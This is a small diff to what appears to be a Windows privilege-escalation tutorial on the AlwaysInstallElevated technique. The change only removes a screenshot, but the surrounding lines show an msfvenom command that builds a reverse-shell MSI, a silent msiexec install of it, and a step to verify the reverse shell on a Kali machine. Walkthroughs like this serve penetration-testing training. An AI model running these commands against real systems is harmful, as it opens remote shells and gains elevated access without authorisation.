@@ -209,10 +209,6 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f msi > nickvou
 msiexec /quiet /qn /i nickvourd.msi
 ```
 
-Outcome:
-
-![AlwaysInstallElevated-New-Session](/Pictures/AlwaysInstallElevated-New-Session.png)
-
 5) Verify the reverse shell on your Kali machine:
 
 ![AlwaysInstallElevated-Elevated-Privileges](/Pictures/AllwaysInstall-Priv-Esc.png)
